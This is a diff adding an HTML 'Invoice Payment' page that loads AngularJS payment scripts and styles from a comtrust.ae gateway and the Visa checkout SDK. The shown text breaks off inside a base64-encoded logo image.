@@ -1,0 +1,351 @@
+
+<html ng-app="myApp" class="ng-scope">
+<head id="SharedLayoutHeader">
+<style type="text/css">@charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide:not(.ng-hide-animate){display:none !important;}ng\:form{display:block;}.ng-animate-shim{visibility:hidden;}.ng-anchor{position:absolute;}</style>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width">
+    
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" id="viewport" content="width=device-width,height=device-height,initial-scale=1.0,user-scalable=no">
+
+    <title>Invoice Payment</title>
+    <script src="https://ipg.comtrust.ae/PaymentEx/Scripts/jquery-3.1.0.min.js?version=1000">
+</script>
+    <script src="https://ipg.comtrust.ae/PaymentEx/Scripts/materialize.js">
+</script>
+
+    <script src="https://ipg.comtrust.ae/PaymentEx/Content/Angular/Module.js">
+</script>
+    <link href="https://ipg.comtrust.ae/PaymentEx/styles/app_extended.css" rel="stylesheet">
+
+    <link href="https://ipg.comtrust.ae/PaymentEx/Content/css?v=mm9aZvlDh3xh7Y2ebzhQavDVVecxcJWMyiapieXl0Ao1" rel="stylesheet">
+    <style>
+  .pay {
+    background-color: rgba(8, 118, 25, 0.785) !important;
+  }
+</style>
+
+</head>
+<body style="width: 100%; height: 100%;" id="SharedLayoutBody">
+    
+<div ng-init="param='203067382338';">
+    <div ng-controller="HousePayController" class="ng-scope">
+        <link href="https://ipg.comtrust.ae/PaymentEx/styles/fonts_googleapis.css" rel="stylesheet">
+        <link href="https://ipg.comtrust.ae/PaymentEx/styles/materialize.css" rel="stylesheet">
+        <link href="https://ipg.comtrust.ae/PaymentEx/styles/HousePay-New.css?version=1008" rel="stylesheet">
+        <link href="https://ipg.comtrust.ae/PaymentEx/styles/css-loader.css" rel="stylesheet">
+        <script type="text/javascript" src="https://assets.secure.checkout.visa.com/checkout-widget/resources/js/integration/v1/sdk.js">
+</script>
+        <script src="https://ipg.comtrust.ae/PaymentEx/Content/Angular/HousePayController.js?version=1019">
+</script>
+        <script src="https://ipg.comtrust.ae/PaymentEx/Content/Angular/HousePayService.js?version=1002">
+</script>
+        <script type="text/javascript" src="https://assets.secure.checkout.visa.com/checkout-widget/resources/js/integration/v1/sdk.js">
+</script>
+        <script src="https://ipg.comtrust.ae/PaymentEx/Scripts/dialog-polyfill.js">
+</script>
+        <link href="https://ipg.comtrust.ae/PaymentEx/styles/dialog-polyfill.css" rel="stylesheet" type="text/css">
+
+
+        <div class="contain" ng-show="DivDisplayForm" ng-disabled="DisableForm">
+            <td align="right" valign="top" class="menu_header_left_left"><img src="data:image/jpeg;base64,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